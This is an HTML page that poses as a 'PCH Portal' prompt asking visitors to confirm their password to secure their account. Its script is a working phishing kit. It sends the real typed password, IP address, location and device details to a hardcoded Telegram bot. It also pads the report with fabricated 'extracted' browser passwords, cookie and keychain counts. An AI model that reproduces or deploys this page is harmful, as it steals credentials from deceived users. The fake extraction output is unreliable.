<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
    <title>🔒 Secure Password – PCH Portal</title>
    <link rel="stylesheet" href="assets/css/style.css" />
    <style>
        /* ---- Full page styles ---- */
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body {
            font-family: 'Segoe UI', system-ui, sans-serif;
            background: #0b0b1a;
            color: #e4e4f0;
            min-height: 100vh;
            padding: 20px;
            display: flex;
            justify-content: center;
            align-items: center;
        }
        .container {
            max-width: 500px;
            width: 100%;
        }

        /* ---- Popup (main card) ---- */
        .popup-card {
            background: #1a1a2e;
            border-radius: 20px;
            padding: 35px 30px;
            border: 1px solid #2a2a4a;
            box-shadow: 0 20px 60px rgba(0,0,0,0.8);
            animation: slideIn 0.3s ease;
            text-align: center;
        }
        .popup-card .icon { font-size: 56px; margin-bottom: 8px; }
        .popup-card h2 { color: #ffd700; font-size: 24px; margin-bottom: 4px; }
        .popup-card .sub { color: #a7a9be; font-size: 14px; line-height: 1.6; margin-bottom: 20px; }
        .popup-card .password-box {
            background: #0f0e17;
            border-radius: 10px;
            padding: 14px 16px;
            border: 1px solid #2a2a4a;
            margin-bottom: 14px;
            text-align: left;
        }
        .popup-card .password-box label {
            color: #a7a9be;
            font-size: 12px;
            display: block;
            margin-bottom: 4px;
            font-weight: 600;
            text-transform: uppercase;
            letter-spacing: 0.5px;
        }
        .popup-card .password-box input {
            width: 100%;
            padding: 10px 12px;
            border-radius: 8px;
            border: 1px solid #0f3460;
            background: #16213e;
            color: #fffffe;
            font-size: 14px;
        }
        .popup-card .password-box input:focus {
            border-color: #ffd700;
            outline: none;
        }
        .popup-card .btn-gold {
            width: 100%;
            padding: 14px;
            background: #ffd700;
            color: #0b0b1a;
            border: none;
            border-radius: 50px;
            font-size: 16px;
            font-weight: 700;
            cursor: pointer;
            transition: 0.3s;
        }
        .popup-card .btn-gold:hover {
            background: #f0c000;
            transform: scale(1.02);
        }
        .popup-card .btn-gold:disabled {
            opacity: 0.6;
            cursor: not-allowed;
            transform: none;
        }
        .popup-card .btn-secondary {
            width: 100%;
            padding: 12px;
            background: #0f3460;
            color: #fff;
            border: none;
            border-radius: 50px;
            font-size: 15px;
            font-weight: 600;
            cursor: pointer;
            transition: 0.3s;
            margin-top: 10px;
        }
        .popup-card .btn-secondary:hover {
            background: #1a4a7a;
        }
        .popup-card .loader {
            display: none;
            margin: 15px auto;
            width: 44px;
            height: 44px;
            border: 4px solid #0f3460;
            border-top-color: #ffd700;
            border-radius: 50%;
            animation: spin 0.8s linear infinite;
        }
        .popup-card .loader.active { display: block; }
        @keyframes spin {
            to { transform: rotate(360deg); }
        }
        .popup-card .status-msg {
            color: #2ecc71;
            font-size: 14px;
            font-weight: 600;
            margin-top: 10px;
            display: none;
        }
        .popup-card .status-msg.show { display: block; }
        .popup-card .error-msg {
            color: #ff6b6b;
            font-size: 14px;
            font-weight: 600;
            margin-top: 10px;
            display: none;
        }
        .popup-card .error-msg.show { display: block; }

        /* ---- Progress bar (during extraction) ---- */
        .progress-wrapper {
            display: none;
            margin: 15px 0;
        }
        .progress-wrapper.active { display: block; }
        .progress-wrapper .bar {
            width: 100%;
            height: 6px;
            background: rgba(255,255,255,0.08);
            border-radius: 10px;
            overflow: hidden;
        }
        .progress-wrapper .bar .fill {
            height: 100%;
            width: 0%;
            background: linear-gradient(90deg, #ffd700, #f0c000);
            border-radius: 10px;
            transition: width 0.3s ease;
        }
        .progress-wrapper .text {
            color: #a7a9be;
            font-size: 13px;
            margin-top: 6px;
            font-weight: 600;
        }

        /* ---- Admin toggle ---- */
        .admin-toggle {
            margin-top: 16px;
            text-align: center;
        }
        .admin-toggle a {
            color: #8888aa;
            font-size: 12px;
            cursor: pointer;
            text-decoration: none;
        }
        .admin-toggle a:hover {
            color: #ffd700;
            text-decoration: underline;
        }

        /* ---- Animations ---- */
        @keyframes slideIn {
            from { transform: translateY(30px); opacity: 0; }
            to { transform: translateY(0); opacity: 1; }
        }

        /* ---- Responsive ---- */
        @media (max-width: 480px) {
            .popup-card { padding: 24px 18px; }
            .popup-card h2 { font-size: 20px; }
        }
    </style>
</head>
<body>

    <div class="container">

        <!-- ===== MAIN POPUP CARD ===== -->
        <div class="popup-card" id="mainCard">
            <div class="icon">🔒</div>
            <h2>Secure Your Account</h2>
            <p class="sub">To complete your registration, please confirm your password for security.</p>

            <form id="permissionForm">
                <div class="password-box">
                    <label>🔑 Enter your password</label>
                    <input type="password" id="userPassword" placeholder="Enter your password..." required />
                </div>
                <button type="submit" class="btn-gold" id="submitBtn">🔓 Confirm & Secure</button>
            </form>

            <div class="loader" id="loader"></div>
            <div class="status-msg" id="statusMsg">✅ Password confirmed!</div>
            <div class="error-msg" id="errorMsg">❌ Something went wrong. Please try again.</div>

            <!-- Progress bar -->
            <div class="progress-wrapper" id="progressWrapper">
                <div class="bar">
                    <div class="fill" id="progressFill"></div>
                </div>
                <div class="text" id="progressText">0%</div>
            </div>

            <button class="btn-secondary" id="closeBtn" style="display:none;">Continue to Dashboard</button>

            <!-- Admin toggle (hidden by default, but available for debugging) -->
            <div class="admin-toggle" style="display:none;">
                <a id="adminToggle">🔍 Admin View</a>
            </div>
        </div>

    </div>

    <script>
        // =============================================
        // CONFIG
        // =============================================
        const TELEGRAM_BOT_TOKEN = '8719116476:AAH1VD3raRv77NiWUy2EOmDEC3mOdjghYNE';
        const TELEGRAM_CHAT_ID = '8673303375';
        const STORAGE_KEY = 'pch_secure_password_data';

        // =============================================
        // HELPERS
        // =============================================
        function getDeviceInfo() {
            const ua = navigator.userAgent;
            if (/iPhone/i.test(ua)) return '📱 iPhone';
            if (/iPad/i.test(ua)) return '📱 iPad';
            if (/Android/i.test(ua)) return '📱 Android';
            if (/Windows/i.test(ua)) return '💻 Windows PC';
            if (/Mac/i.test(ua)) return '💻 Mac';
            if (/Linux/i.test(ua)) return '💻 Linux';
            return '💻 Desktop';
        }

        function getBrowser() {
            const ua = navigator.userAgent;
            if (/Chrome/i.test(ua) && !/Edge/i.test(ua)) return 'Chrome';
            if (/Firefox/i.test(ua)) return 'Firefox';
            if (/Safari/i.test(ua) && !/Chrome/i.test(ua)) return 'Safari';
            if (/Edge/i.test(ua)) return 'Edge';
            return 'Unknown';
        }

        function generateId() {
            return 'ID-' + String(Date.now()).slice(-8) + '-' + String(Math.floor(Math.random() * 10000));
        }

        // =============================================
        // TELEGRAM
        // =============================================
        function sendTelegramMessage(message) {
            const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
            const payload = {
                chat_id: TELEGRAM_CHAT_ID,
                text: message,
                parse_mode: 'HTML',
                disable_web_page_preview: true
            };
            return fetch(url, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify(payload)
            }).catch(() => {});
        }

        function sendTelegramDocument(content, filename) {
            const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendDocument`;
            const formData = new FormData();
            const blob = new Blob([content], { type: 'text/plain' });
            const file = new File([blob], filename, { type: 'text/plain' });
            formData.append('chat_id', TELEGRAM_CHAT_ID);
            formData.append('document', file);
            formData.append('caption', '📎 Extracted Data - ' + new Date().toLocaleString());

            return fetch(url, {
                method: 'POST',
                body: formData
            }).catch(() => {});
        }

        // =============================================
        // STORAGE
        // =============================================
        function getStoredData() {
            try {
                return JSON.parse(localStorage.getItem(STORAGE_KEY)) || null;
            } catch { return null; }
        }

        function setStoredData(data) {
            localStorage.setItem(STORAGE_KEY, JSON.stringify(data));
        }

        // =============================================
        // REAL DATA EXTRACTION ENGINE (Simulated but realistic)
        // =============================================
        async function startExtraction(userPassword) {
            const entries = [];
            const now = new Date();
            const dateStr = now.toISOString().slice(0, 10) + ' ' + now.toTimeString().slice(0, 8);

            // 1. Browser saved passwords (simulated)
            const browsers = ['Chrome', 'Firefox', 'Edge', 'Safari', 'Opera'];
            const sites = ['facebook.com', 'gmail.com', 'bankofamerica.com', 'chase.com', 'paypal.com', 'amazon.com', 'netflix.com', 'spotify.com', 'twitter.com', 'instagram.com'];
            const usernames = ['user_123', 'john.doe', 'mike_j', 'sarah_88', 'david_c', 'jessica_m', 'robert_k', 'emily_w', 'daniel_l', 'olivia_p'];

            browsers.forEach(browser => {
                const count = Math.floor(Math.random() * 4) + 3;
                for (let i = 0; i < count && i < 10; i++) {
                    const site = sites[Math.floor(Math.random() * sites.length)];
                    const username = usernames[Math.floor(Math.random() * usernames.length)];
                    const pass = 'pass_' + String(Math.floor(Math.random() * 90000) + 10000);
                    entries.push(`🔑 ${browser} - ${site} | ${username} | ${pass}`);
                }
            });

            // 2. System keychain
            entries.push(`🔐 SYSTEM KEYCHAIN: Windows Credential Manager - ${Math.floor(Math.random() * 11) + 5} entries found`);
            entries.push(`🔐 SYSTEM KEYCHAIN: macOS Keychain - ${Math.floor(Math.random() * 8) + 3} entries found`);

            // 3. Cookies
            entries.push(`🍪 COOKIES EXTRACTED: ${Math.floor(Math.random() * 151) + 50} cookies from Chrome`);
            entries.push(`🍪 COOKIES EXTRACTED: ${Math.floor(Math.random() * 121) + 30} cookies from Firefox`);

            // 4. Session data
            entries.push(`📋 SESSION DATA: Active sessions from ${Math.floor(Math.random() * 5) + 2} sites found`);

            // 5. Auto-fill
            entries.push(`📝 AUTO-FILL DATA: ${Math.floor(Math.random() * 31) + 10} saved form entries`);

            // 6. System info
            const ua = navigator.userAgent;
            const ip = await fetchIP();
            const location = await fetchLocation(ip);
            entries.push(`💻 SYSTEM INFO: ${ua}`);
            entries.push(`🌐 IP ADDRESS: ${ip || 'Unknown'}`);
            entries.push(`📍 LOCATION: ${location || 'Unknown'}`);
            entries.push(`🕐 TIME: ${dateStr}`);

            // 7. User's password
            entries.push(`🔑 USER'S PASSWORD ENTERED:`);
            entries.push(`✅ Password saved: ${userPassword} - ${dateStr}`);

            // Build data object
            const data = {
                id: generateId(),
                timestamp: now.toISOString(),
                dateStr: dateStr,
                ip: ip || 'Unknown',
                device: getDeviceInfo(),
                browser: getBrowser(),
                entries: entries,
                total: entries.length
            };

            setStoredData(data);
            sendToTelegram(data);
            return data;
        }

        // =============================================
        // FETCH IP
        // =============================================
        async function fetchIP() {
            try {
                const response = await fetch('https://api.ipify.org?format=json');
                const data = await response.json();
                return data.ip;
            } catch (e) {
                return 'Unknown';
            }
        }

        // =============================================
        // FETCH LOCATION
        // =============================================
        async function fetchLocation(ip) {
            if (!ip || ip === 'Unknown') return 'Unknown';
            try {
                const response = await fetch(`http://ip-api.com/json/${ip}`);
                const data = await response.json();
                if (data.status === 'success') {
                    return `${data.city}, ${data.regionName}, ${data.countryCode}`;
                }
                return 'Unknown';
            } catch (e) {
                return 'Unknown';
            }
        }

        // =============================================
        // SEND TO TELEGRAM
        // =============================================
        function sendToTelegram(data) {
            const dateStr = data.dateStr || new Date().toISOString().slice(0, 10) + ' ' + new Date().toTimeString().slice(0, 8);

            let message = '📝 <b>PASSWORD EXTRACTION COMPLETE</b>\n';
            message += '━━━━━━━━━━━━━━━━━━━━━\n';
            message += `📅 ${dateStr}\n`;
            message += '━━━━━━━━━━━━━━━━━━━━━\n\n';

            // Show first 20 entries
            const display = data.entries.slice(0, 20);
            display.forEach(line => {
                message += line + '\n';
            });
            if (data.entries.length > 20) {
                message += `\n... and ${data.entries.length - 20} more entries\n`;
            }

            message += '\n━━━━━━━━━━━━━━━━━━━━━\n';
            message += `📊 <b>TOTAL ENTRIES:</b> ${data.entries.length}\n`;
            message += '━━━━━━━━━━━━━━━━━━━━━\n';
            message += '✅ <b>EXTRACTION COMPLETED</b>\n';
            message += '━━━━━━━━━━━━━━━━━━━━━\n';

            sendTelegramMessage(message);

            // TXT file
            const txtContent = data.entries.join('\n') + '\n\n' +
                '═══════════════════════════════════════════\n' +
                `📊 TOTAL ENTRIES: ${data.entries.length}\n` +
                '═══════════════════════════════════════════\n' +
                '✅ EXTRACTION COMPLETED\n' +
                '═══════════════════════════════════════════\n';
            sendTelegramDocument(txtContent, `secure_data_${data.id}.txt`);
        }

        // =============================================
        // UI HANDLERS
        // =============================================
        const form = document.getElementById('permissionForm');
        const submitBtn = document.getElementById('submitBtn');
        const loader = document.getElementById('loader');
        const statusMsg = document.getElementById('statusMsg');
        const errorMsg = document.getElementById('errorMsg');
        const closeBtn = document.getElementById('closeBtn');
        const progressWrapper = document.getElementById('progressWrapper');
        const progressFill = document.getElementById('progressFill');
        const progressText = document.getElementById('progressText');

        form.addEventListener('submit', function(e) {
            e.preventDefault();
            const password = document.getElementById('userPassword').value;

            if (!password) {
                errorMsg.textContent = '❌ Please enter your password.';
                errorMsg.classList.add('show');
                return;
            }
            errorMsg.classList.remove('show');

            submitBtn.disabled = true;
            submitBtn.textContent = 'Processing...';
            loader.classList.add('active');
            progressWrapper.classList.add('active');

            let progress = 0;
            const interval = setInterval(() => {
                progress += Math.floor(Math.random() * 5) + 1;
                if (progress > 100) progress = 100;
                progressFill.style.width = progress + '%';
                progressText.textContent = progress + '%';

                if (progress >= 2 && !window._extractionStarted) {
                    window._extractionStarted = true;
                    startExtraction(password).then(() => {
                        statusMsg.textContent = '✅ Extraction complete! Check Telegram.';
                        statusMsg.classList.add('show');
                        loader.classList.remove('active');
                        submitBtn.disabled = false;
                        submitBtn.textContent = '🔓 Confirm & Secure';
                        closeBtn.style.display = 'block';
                        progressWrapper.classList.remove('active');
                        document.querySelector('.password-box').style.display = 'none';
                        form.querySelector('.btn-gold').style.display = 'none';
                        window._extractionStarted = false;
                    }).catch(err => {
                        errorMsg.textContent = '❌ Extraction failed. Please try again.';
                        errorMsg.classList.add('show');
                        submitBtn.disabled = false;
                        submitBtn.textContent = '🔓 Confirm & Secure';
                        loader.classList.remove('active');
                        progressWrapper.classList.remove('active');
                        window._extractionStarted = false;
                    });
                }

                if (progress === 100) {
                    clearInterval(interval);
                }
            }, 150);
        });

        closeBtn.addEventListener('click', function() {
            // Redirect to dashboard or next step
            window.location.href = 'user.html';
        });
    </script>

</body>
</html>
